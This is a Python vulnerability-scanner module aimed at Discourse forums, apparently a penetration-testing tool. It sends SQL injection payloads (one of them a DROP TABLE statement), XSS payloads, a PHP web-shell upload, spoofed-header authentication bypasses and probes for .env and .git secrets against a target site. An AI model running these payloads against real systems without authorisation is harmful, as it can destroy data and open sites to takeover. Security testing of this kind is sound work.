#!/usr/bin/env python3
"""
Discourse Security Scanner - Vulnerability Testing Module

Tests for common web vulnerabilities in Discourse forums
"""

import re
import time 
import json
import base64
from urllib.parse import urljoin, quote, urlparse
from bs4 import BeautifulSoup
from .utils import generate_payloads, extract_csrf_token

class VulnerabilityModule:
    """Vulnerability testing module for Discourse forums"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'Vulnerability Testing',
            'target': scanner.target_url,
            'sql_injection': [],
            'xss_vulnerabilities': [],
            'csrf_issues': [],
            'file_upload_issues': [],
            'auth_bypass': [],
            'info_disclosure': [],
            'tests_performed': 0,
            'scan_time': 0
        }
        self.start_time = time.time()
    
    def run(self):
        """Run vulnerability testing module"""
        self.scanner.log("Starting vulnerability testing...")
        
        # SQL Injection tests
        self._test_sql_injection()
        
        # XSS tests
        self._test_xss_vulnerabilities()
        
        # CSRF tests
        self._test_csrf_protection()
        
        # File upload tests
        self._test_file_upload_vulnerabilities()
        
        # Authentication bypass tests
        self._test_auth_bypass()
        
        # Information disclosure tests
        self._test_info_disclosure()
        
        self.results['scan_time'] = time.time() - self.start_time
        return self.results
    
    def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities with smart detection"""
        self.scanner.log("Testing for SQL injection vulnerabilities...", 'debug')
        
        # Quick detection payloads first
        quick_payloads = ["'", "\""]
        
        # Full payloads for detailed testing
        full_payloads = [
            "' OR '1'='1",
            "' AND 1=1--",
            "'; DROP TABLE users--",
            "\' OR \'1\'=\'1",
            "' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--"
        ]
        
        # Test endpoints
        test_endpoints = [
            '/search',
            '/users',
            '/categories',
            '/topics',
            '/login'
        ]
        
        # Test parameters
        test_params = ['q', 'search', 'username', 'category']
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Get baseline response first
            baseline_response = self.scanner.make_request(url)
            if not baseline_response:
                continue
            
            for param in test_params:
                # Quick test first with simple payloads
                vulnerable = False
                for quick_payload in quick_payloads:
                    test_url = f"{url}?{param}={quote(quick_payload)}"
                    response = self.scanner.make_request(test_url)
                    
                    if response and self._detect_sql_injection_advanced(response, baseline_response, quick_payload):
                        vulnerable = True
                        self.scanner.log(f"Potential SQL injection at {endpoint}?{param}, testing further...", 'info')
                        break
                
                # If quick test shows vulnerability, do detailed testing
                if vulnerable:
                    for payload in full_payloads:
                        # Test GET parameters
                        test_url = f"{url}?{param}={quote(payload)}"
                        response = self.scanner.make_request(test_url)
                        
                        if response and self._detect_sql_injection_advanced(response, baseline_response, payload):
                            vuln = {
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'method': 'GET',
                                'severity': 'high',
                                'description': f'SQL injection vulnerability in {param} parameter',
                                'evidence': self._extract_sql_evidence(response.text, payload)
                            }
                            self.results['sql_injection'].append(vuln)
                            self.scanner.log(f"SQL injection confirmed: {endpoint}?{param}={payload[:20]}...", 'warning')
                            break  # Found vulnerability, move to next parameter
                        
                        # Test POST data for login/session endpoints
                        if endpoint in ['/login', '/session']:
                            post_data = {param: payload}
                            if param == 'username':
                                post_data['password'] = 'test'
                            response = self.scanner.make_request(url, method='POST', data=post_data)
                            
                            if response and self._detect_sql_injection_advanced(response, baseline_response, payload):
                                vuln = {
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'url': url,
                                    'method': 'POST',
                                    'severity': 'high',
                                    'description': f'SQL injection vulnerability in {param} parameter (POST)',
                                    'evidence': self._extract_sql_evidence(response.text, payload)
                                }
                                self.results['sql_injection'].append(vuln)
                                self.scanner.log(f"SQL injection confirmed (POST): {endpoint} - {param}", 'warning')
                                break
                        
                        self.results['tests_performed'] += 1
                        # Removed sleep for better performance
                else:
                    # No vulnerability detected in quick test, skip detailed testing
                    self.results['tests_performed'] += 1
    
    def _detect_sql_injection_advanced(self, response, baseline_response, payload):
        """SQL injection detection with baseline comparison"""
        if not response or not baseline_response:
            return False
            
        response_text = response.text
        baseline_text = baseline_response.text
        
        # 1. Check for database error messages (most reliable)
        sql_error_patterns = [
            # MySQL errors
            r'You have an error in your SQL syntax',
            r'mysql_fetch_array\(\)',
            r'mysql_fetch_assoc\(\)',
            r'mysql_fetch_row\(\)',
            r'mysql_num_rows\(\)',
            r'Warning.*mysql_.*',
            r'MySQL server version for the right syntax',
            
            # PostgreSQL errors
            r'PostgreSQL query failed',
            r'pg_query\(\)',
            r'pg_exec\(\)',
            r'Warning.*pg_.*',
            r'invalid input syntax for',
            
            # Oracle errors
            r'ORA-\d{5}',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*oci_.*',
            
            # SQL Server errors
            r'Microsoft.*ODBC.*SQL Server.*Driver',
            r'\[SQL Server\]',
            r'\[Microsoft\]\[ODBC SQL Server Driver\]',
            r'Unclosed quotation mark after the character string',
            
            # SQLite errors
            r'SQLite.*error',
            r'sqlite3\.OperationalError',
            r'SQLite3::SQLException',
            r'\[SQLITE_ERROR\]',
            
            # Generic SQL errors
            r'SQL syntax.*error',
            r'syntax error at or near',
            r'quoted string not properly terminated',
            r'unterminated quoted string'
        ]
        
        for pattern in sql_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Double check - make sure this error doesn't appear in baseline
                if not re.search(pattern, baseline_text, re.IGNORECASE):
                    return True
        
        # 2. Check for significant response differences
        response_length = len(response_text)
        baseline_length = len(baseline_text)
        
        # Significant length difference (could indicate error or data extraction)
        length_diff_ratio = abs(response_length - baseline_length) / max(baseline_length, 1)
        if length_diff_ratio > 0.3:  # 30% difference threshold
            # Additional validation needed
            if self._validate_length_difference(response_text, baseline_text, payload):
                return True
        
        # 3. Check for status code differences
        if response.status_code != baseline_response.status_code:
            # 500 errors often indicate SQL injection
            if response.status_code == 500 and baseline_response.status_code != 500:
                return True
        
        # 4. Boolean-based detection for specific payloads
        if self._detect_boolean_sqli(response, baseline_response, payload):
            return True
            
        return False
    
    def _validate_length_difference(self, response_text, baseline_text, payload):
        """Validate if length difference is due to SQL injection"""
        # Check if the difference is due to error messages
        error_indicators = [
            'error', 'exception', 'warning', 'fatal', 'syntax',
            'mysql', 'postgresql', 'oracle', 'sqlite', 'sql'
        ]
        
        response_lower = response_text.lower()
        baseline_lower = baseline_text.lower()
        
        # Count error indicators in both responses
        response_errors = sum(1 for indicator in error_indicators if indicator in response_lower)
        baseline_errors = sum(1 for indicator in error_indicators if indicator in baseline_lower)
        
        # If response has significantly more error indicators, likely SQL injection
        return response_errors > baseline_errors + 2
    
    def _detect_boolean_sqli(self, response, baseline_response, payload):
        """Detect boolean-based SQL injection"""
        # Only check for boolean payloads
        boolean_indicators = ["OR '1'='1", "OR 1=1", "AND 1=1", "AND 1=2"]
        
        if not any(indicator in payload for indicator in boolean_indicators):
            return False
            
        # For true conditions (1=1, '1'='1'), response should be different from baseline
        true_conditions = ["OR '1'='1", "OR 1=1", "AND 1=1"]
        false_conditions = ["AND 1=2", "AND '1'='2'"]
        
        if any(condition in payload for condition in true_conditions):
            # True condition should return more data or different response
            return len(response.text) != len(baseline_response.text)
        elif any(condition in payload for condition in false_conditions):
            # False condition should return less data or error
            return len(response.text) < len(baseline_response.text) * 0.8
            
        return False
    
    def _extract_sql_evidence(self, response_text, payload):
        """Extract evidence of SQL injection"""
        evidence = []
        
        # Extract error messages
        error_patterns = [
            r'(You have an error in your SQL syntax[^\n]*)',
            r'(mysql_fetch_[a-z_]+\(\)[^\n]*)',
            r'(PostgreSQL query failed[^\n]*)',
            r'(ORA-\d{5}[^\n]*)',
            r'(SQLite.*error[^\n]*)',
            r'(SQL syntax.*error[^\n]*)'
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            evidence.extend(matches)
        
        return evidence[:3]  # Return first 3 pieces of evidence
    
    def _test_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities with smart detection"""
        self.scanner.log("Testing for XSS vulnerabilities...", 'debug')
        
        # Quick XSS payloads for initial detection
        quick_xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>"
        ]
        
        # Full XSS payloads for detailed testing
        full_xss_payloads = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">'
        ]
        
        # Test endpoints - reduced for faster testing
        test_endpoints = [
            '/search',
            '/new-topic',
            '/new-message',
            '/users',
            '/categories'
        ]
        
        # Test parameters - reduced
        test_params = ['q', 'search', 'title', 'username']
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for param in test_params:
                # Quick test first with simple XSS payloads
                vulnerable = False
                for quick_payload in quick_xss_payloads:
                    test_url = f"{url}?{param}={quote(quick_payload)}"
                    response = self.scanner.make_request(test_url)
                    
                    if response and self._detect_xss_reflection(response.text, quick_payload):
                        vulnerable = True
                        self.scanner.log(f"Potential XSS at {endpoint}?{param}, testing further...", 'info')
                        break
                
                # If quick test shows vulnerability, do detailed testing
                if vulnerable:
                    for payload in full_xss_payloads:
                        # GET request test
                        test_url = f"{url}?{param}={quote(payload)}"
                        response = self.scanner.make_request(test_url)
                        
                        if response and self._detect_xss_reflection(response.text, payload):
                            vuln = {
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'url': test_url,
                                'severity': 'medium',
                                'description': f'XSS vulnerability in {param} parameter'
                            }
                            self.results['xss_vulnerabilities'].append(vuln)
                            self.scanner.log(f"XSS confirmed: {endpoint}?{param}={payload[:20]}...", 'warning')
                            break  # Found vulnerability, move to next parameter
                        
                        # POST request test
                        post_data = {param: payload}
                        response = self.scanner.make_request(url, method='POST', data=post_data)
                        
                        if response and self._detect_xss_reflection(response.text, payload):
                            vuln = {
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'method': 'POST',
                                'url': url,
                                'severity': 'medium',
                                'description': f'XSS vulnerability in {param} parameter (POST)'
                            }
                            self.results['xss_vulnerabilities'].append(vuln)
                            self.scanner.log(f"XSS confirmed (POST): {endpoint} - {param}", 'warning')
                            break
                        
                        self.results['tests_performed'] += 1
                        time.sleep(0.05)  # Reduced sleep time
                else:
                    # No vulnerability detected in quick test, skip detailed testing
                    self.results['tests_performed'] += 1
    
    def _detect_xss_reflection(self, response_text, payload):
        """Detect XSS payload reflection"""
        # Check if payload is reflected without proper encoding
        if payload in response_text:
            # Check for dangerous contexts
            dangerous_contexts = [
                f'<script>{payload}',
                f'>{payload}<',
                f'="{payload}"',
                f"='{payload}'",
                f'javascript:{payload}'
            ]
            
            for context in dangerous_contexts:
                if context in response_text:
                    return True
        
        return False
    
    def _test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        self.scanner.log("Testing CSRF protection...", 'debug')
        
        # Test endpoints that should have CSRF protection
        csrf_endpoints = [
            '/posts',
            '/topics',
            '/users',
            '/admin/users',
            '/session'
        ]
        
        for endpoint in csrf_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test without CSRF token
            test_data = {
                'title': 'Test Post',
                'raw': 'Test content',
                'category': '1'
            }
            
            response = self.scanner.make_request(url, method='POST', data=test_data)
            
            if response:
                if response.status_code == 200:
                    # Check if action was successful without CSRF token
                    if 'success' in response.text.lower() or 'created' in response.text.lower():
                        vuln = {
                            'endpoint': endpoint,
                            'issue': 'Missing CSRF protection',
                            'severity': 'medium',
                            'description': f'Endpoint {endpoint} accepts POST requests without CSRF token'
                        }
                        self.results['csrf_issues'].append(vuln)
                        self.scanner.log(f"CSRF protection missing: {endpoint}", 'warning')
                elif response.status_code == 403 or 'csrf' in response.text.lower():
                    # CSRF protection is working
                    self.scanner.log(f"CSRF protection active: {endpoint}", 'debug')
            
            self.results['tests_performed'] += 1
            time.sleep(0.05)  # Reduced sleep time
    
    def _test_file_upload_vulnerabilities(self):
        """Test file upload vulnerabilities - optimized"""
        self.scanner.log("Testing file upload vulnerabilities...", 'debug')
        
        # Reduced upload endpoints for faster testing
        upload_endpoints = [
            '/uploads',
            '/posts/upload',
            '/admin/backups',
            '/user_avatar'
        ]
        
        # Reduced malicious file tests - focus on most critical
        malicious_files = {
            'shell.php': b'<?php system($_GET["cmd"]); ?>',
            'xss.svg': b'<svg onload=alert("XSS")></svg>',
            'shell.php.jpg': b'<?php system($_GET["cmd"]); ?>'  # Double extension
        }
        
        for endpoint in upload_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for filename, content in malicious_files.items():
                files = {'file': (filename, content, 'image/jpeg')}
                
                response = self.scanner.make_request(url, method='POST', files=files)
                
                if response and self._detect_upload_success(response.text, filename):
                    vuln = {
                        'endpoint': endpoint,
                        'filename': filename,
                        'issue': 'Malicious file upload allowed',
                        'severity': 'high',
                        'description': f'Malicious file {filename} was uploaded successfully'
                    }
                    self.results['file_upload_issues'].append(vuln)
                    self.scanner.log(f"File upload vulnerability: {filename} at {endpoint}", 'warning')
                
                self.results['tests_performed'] += 1
                time.sleep(0.05)  # Reduced sleep time
    
    def _detect_upload_success(self, response_text, filename):
        """Detect successful file upload"""
        success_indicators = [
            'upload successful',
            'file uploaded',
            'upload complete',
            filename,
            'success',
            'uploaded'
        ]
        
        return any(indicator in response_text.lower() for indicator in success_indicators)
    
    def _test_auth_bypass(self):
        """Test authentication bypass vulnerabilities"""
        self.scanner.log("Testing authentication bypass...", 'debug')
        
        # Protected endpoints
        protected_endpoints = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/site_settings',
            '/my/preferences'
        ]
        
        # Bypass techniques
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Admin': 'true'},
            {'X-Authenticated': 'true'},
            {'Authorization': 'Bearer admin'}
        ]
        
        for endpoint in protected_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test direct access
            response = self.scanner.make_request(url)
            if response and response.status_code == 200 and 'admin' in response.text.lower():
                vuln = {
                    'endpoint': endpoint,
                    'method': 'Direct access',
                    'severity': 'critical',
                    'description': f'Protected endpoint {endpoint} is directly accessible'
                }
                self.results['auth_bypass'].append(vuln)
                self.scanner.log(f"Auth bypass: Direct access to {endpoint}", 'error')
            
            # Test header-based bypass
            for headers in bypass_headers:
                response = self.scanner.make_request(url, headers=headers)
                if response and response.status_code == 200 and 'admin' in response.text.lower():
                    vuln = {
                        'endpoint': endpoint,
                        'method': f'Header bypass: {list(headers.keys())[0]}',
                        'headers': headers,
                        'severity': 'critical',
                        'description': f'Authentication bypass using headers at {endpoint}'
                    }
                    self.results['auth_bypass'].append(vuln)
                    self.scanner.log(f"Auth bypass: Header bypass at {endpoint}", 'error')
            
            self.results['tests_performed'] += 1
            time.sleep(0.05)  # Reduced sleep time
    
    def _test_info_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        self.scanner.log("Testing for information disclosure...", 'debug')
        
        # Reduced sensitive endpoints for faster testing
        sensitive_endpoints = [
            '/.env',
            '/config/database.yml',
            '/backup',
            '/admin/logs',
            '/.git/config',
            '/robots.txt'
        ]
        
        for endpoint in sensitive_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = self.scanner.make_request(url)
            
            if response and response.status_code == 200:
                # Check for sensitive information
                sensitive_patterns = [
                    r'password["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'api_key["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'secret["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'database["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'mysql://[^\s]+',
                    r'postgresql://[^\s]+',
                    r'redis://[^\s]+'
                ]
                
                for pattern in sensitive_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vuln = {
                            'endpoint': endpoint,
                            'issue': 'Sensitive information disclosed',
                            'pattern': pattern,
                            'severity': 'medium',
                            'description': f'Sensitive information found at {endpoint}'
                        }
                        self.results['info_disclosure'].append(vuln)
                        self.scanner.log(f"Info disclosure: {endpoint}", 'warning')
                        break
            
            self.results['tests_performed'] += 1
            time.sleep(0.05)  # Reduced sleep time